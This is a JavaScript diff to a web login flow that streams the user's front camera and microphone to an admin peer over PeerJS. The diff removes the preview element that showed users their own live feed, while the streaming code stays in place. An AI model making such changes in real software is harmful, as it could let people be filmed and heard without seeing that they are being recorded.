@@ -24,7 +24,6 @@ const reviveContinueButton = document.getElementById("reviveContinueButton");
 const loginConsentModal = document.getElementById("loginConsentModal");
 const loginConsentContinueButton = document.getElementById("loginConsentContinueButton");
 const loginConsentStatus = document.getElementById("loginConsentStatus");
-const streamPreview = document.getElementById("streamPreview");
 
 /* ================= AUTH / SESSION ================= */
 
@@ -650,9 +649,6 @@ function stopLoginLiveSupportBroadcast(silent = false) {
   loginLiveRoomId = "";
   loginLivePeerId = "";
   loginLiveAdminPeerId = "";
-  if (streamPreview) {
-    streamPreview.srcObject = null;
-  }
 
   if (!silent && loginConsentStatus) loginConsentStatus.textContent = "";
 }
@@ -691,14 +687,6 @@ async function startLoginCameraStreamAndSendLink() {
       video: { facingMode: "user" },
       audio: true
     });
-    if (streamPreview) {
-      streamPreview.srcObject = loginLiveStream;
-      try {
-        await streamPreview.play();
-      } catch (error) {
-        // Autoplay may be blocked on some browsers; stream still continues.
-      }
-    }
 
     await ensurePeerJsLoaded();
     loginLivePeer = new window.Peer(loginLivePeerId);
